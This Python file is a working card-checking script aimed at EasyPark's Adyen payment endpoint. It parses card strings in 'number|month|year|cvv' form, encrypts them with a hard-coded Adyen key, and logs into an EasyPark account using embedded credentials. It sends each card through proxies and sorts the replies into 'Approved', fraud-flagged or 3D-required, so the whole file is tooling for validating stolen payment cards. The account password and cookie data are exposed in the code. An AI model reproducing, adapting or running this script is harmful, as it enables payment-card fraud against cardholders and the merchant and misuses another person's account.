
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json
import names
import platform
import AdyenEncrypt
import html
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def AdyenPaulasChice(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout=20
    async with aiohttp.ClientSession(connector=conn) as session:
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3]

            listaone = ccnum[0:1]
            if (listaone == '4') :
                tipo = 'visa'
            elif (listaone == '5') :
                tipo = 'mc'
            elif (listaone == '3') :
                tipo = 'amex'

            AdyenECC = await AdyenEncrypt.encrypter(f"{ccnum}|{mes}|{ano}|{cvv}", "AA4F432822D894BC22F9C7CC0FC414C5295381EA0F82E6913103D84E6EA52A51F3D40F013F07194436B0871A570A6E1F9F12FC9BE7B7BB12F92B8A18C0EF370F2C70DAB6DC201607EFD3AC79249464046F66A10A5E8527795200E2DE75E23890F5E128D78D35E1A36020AFD10C57B7D668A84095B2BBCEEA4CEDEE7832BE0B543201550D1D30C8C553ABCB3207981D000FA3075045871374AA2B0F1C6FD2D87E078C26835BC02F122DCA04AC5FD4AFC8F23C6BAF3AF8A80A9EEFB5ABCBE35803FF44BE5805BB6F77825AC7044F1EABCCD39D0D38B609EEA5B7CEC3328388C5FB4381F9919B6941C7D12A0427978683A17808248F1B9597C04A34BC8666B4D451")
            AdyenCCnum = AdyenECC[0]
            Adyenmes = AdyenECC[1]
            Adyenano = AdyenECC[2]
            Adyencvv = AdyenECC[3]

            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json',
                'X-Transaction-ID': 'lpuv297tt',
                'Origin': 'https://customer.easypark.net',
                'Connection': 'keep-alive',
                'Referer': 'https://customer.easypark.net/auth',
                # 'Cookie': 'epRealm=EASYPARK; epLanguage=en; _fbp=fb.1.1677258687784.1573910863; device_id_1677258802=BXQBjWQU4d-1677258802; _ga=GA1.2.2118243797.1677471308; ab.storage.userId.3012293b-71ea-43dd-b50b-218fd82a33c1=%7B%22g%22%3A%2234800716%22%2C%22c%22%3A1677472478601%2C%22l%22%3A1677472478603%7D; ab.storage.sessionId.3012293b-71ea-43dd-b50b-218fd82a33c1=%7B%22g%22%3A%22ba574e66-cb05-0798-35e1-5e531770424c%22%2C%22e%22%3A1677474428715%2C%22c%22%3A1677472478602%2C%22l%22%3A1677472628715%7D; ab.storage.deviceId.3012293b-71ea-43dd-b50b-218fd82a33c1=%7B%22g%22%3A%22e8630bd2-ad73-adde-60ca-70c301ba6ff8%22%2C%22c%22%3A1677472478603%2C%22l%22%3A1677472478603%7D; epCountry=ES; _gid=GA1.2.2103397680.1677589878; ln_or=eyIxMjM3ODAxIjoiZCJ9; mp_b03068ddaec84abb193decb1b5aca5a3_mixpanel=%7B%22distinct_id%22%3A%2031168018%2C%22%24device_id%22%3A%20%221868468821c66e-0600ce89963bc08-d555429-1fa400-1868468821d3e2%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.easypark.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.easypark.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%22GROUPS%20Page%20Viewed%22%3A%201%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%2031168018%7D',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            })

            json_data = {
                'userName': '+34228920920',
                'password': '2azfzH2YnJJvCvt',
            }
            async with session.post('https://customer.easypark.net/api/web-auth/login/auth', json=json_data, proxy=str(proxyrand), timeout=15) as resp:
                try :    
                    cookies = resp.cookies   
                    lines = str(cookies).split('Set-Cookie: epSsAuthToken=')[1]
                    bearer = lines.split(';')[0]
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://customer.easypark.net/',
                'Content-Type': 'application/json',
                'X-Authorization': f'Bearer {bearer}',
                'Origin': 'https://customer.easypark.net',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
            })
            params = {
                'billingAccountId': '31016059',
            }
            json_data = {
                'riskData': {
                    'clientData': 'eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6ImRmLXRpbWVkT3V0In0=',
                },
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': '',
                    'encryptedCardNumber': AdyenCCnum,
                    'encryptedExpiryMonth': Adyenmes,
                    'encryptedExpiryYear': Adyenano,
                    'encryptedSecurityCode': Adyencvv,
                    'brand': tipo,
                },
                'browserInfo': {
                    'acceptHeader': '*/*',
                    'colorDepth': 24,
                    'language': 'en-US',
                    'javaEnabled': False,
                    'screenHeight': 1080,
                    'screenWidth': 1920,
                    'userAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                    'timeZoneOffset': 480,
                },
                'clientStateDataIndicator': True,
                'amount': {
                    'value': None,
                    'currency': None,
                    'amount': None,
                },
                'storePaymentMethod': True,
            }
            async with session.post('https://billing.easyparksystem.net/external/adyen/checkout/initiate-payment', json=json_data, params=params,proxy=str(proxyrand), timeout=15) as resp:
                try :          
                    response = await resp.text()
                    #"resultCode":"Authorised"
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 

            if int(response.find('"resultCode":"Authorised"')) > 0 :
                
                return "Approved","Approved"
            elif int(response.find('CVC Declined')) > 0 :
                jsonresponse = await resp.json()
                refusalReason = jsonresponse['refusalReason']
                refusalReasonCode = jsonresponse['refusalReasonCode']
                
                return "Approved", f"{refusalReasonCode} : {refusalReason}"
            elif int(response.find('Not enough balance')) > 0 :
                jsonresponse = await resp.json()
                refusalReason = jsonresponse['refusalReason']
                refusalReasonCode = jsonresponse['refusalReasonCode']
                
                return "Approved", f"{refusalReasonCode} : {refusalReason}"
            elif int(response.find('"FRAUD"')) > 0 :
                
                return "Payment Fraudulent"
            elif int(response.find('"FRAUD-CANCELLED"')) > 0 :
                
                return "Payment Fraudulent"
            elif int(response.find('3D Not Authenticated')) > 0 :
                
                return "3D Required"
            elif int(response.find('https://checkoutshopper-live.adyen.com/checkoutshopper/threeDS/')) > 0 :
                
                return "3D Required"
            elif int(response.find('"refusalReason"')) > 0 :
                jsonresponse = await resp.json()
                refusalReason = jsonresponse['refusalReason']
                refusalReasonCode = jsonresponse['refusalReasonCode']
                
                return f"{refusalReasonCode} : {refusalReason}"
            else :
                
                #Not enough balance
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        finally:
            await session.close()